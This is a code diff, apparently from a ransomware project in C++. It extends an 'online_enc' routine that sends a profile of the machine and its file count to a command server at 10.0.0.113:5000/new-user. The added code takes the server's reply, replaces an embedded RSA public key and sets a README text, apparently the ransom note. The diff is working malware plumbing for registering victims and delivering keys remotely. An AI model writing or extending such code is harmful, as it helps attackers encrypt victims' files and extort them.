@@ -20,6 +20,7 @@
 #include "Helpers/profiler.h"
 #include "Communication/sendrequest.h"
 #include "Helpers/line_count.hpp"
+#include "Helpers/base64decode.hpp"
 
 
 std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
@@ -83,7 +84,22 @@ int online_enc() {
     nlohmann::json profileJson = profiler(filesCount);
     std::cout << profileJson.dump(4) << std::endl;
     std::string response = sendrequest(L"https://10.0.0.113:5000/new-user", profileJson);
+    
+    // read json response and write it to global variables:
+    auto jsonResponse = nlohmann::json::parse(response);
 
+    // Check for presence of "message" key and its value
+    if (jsonResponse.contains("message") && jsonResponse["message"] == "success") {
+        // Update global variables if respective keys exist
+        if (jsonResponse.contains("data")) {
+            OFF_README = DecodeBase64(jsonResponse["data"]);
+        }
+        if (jsonResponse.contains("public_key")) {
+            PUBLIC_KEY = jsonResponse["public_key"];
+        }
+    }
+    std::cout << "OFF_README: " << OFF_README << std::endl;
+    std::cout << "PUBLIC_KEY: " << PUBLIC_KEY << std::endl;
     
 
     return 0;
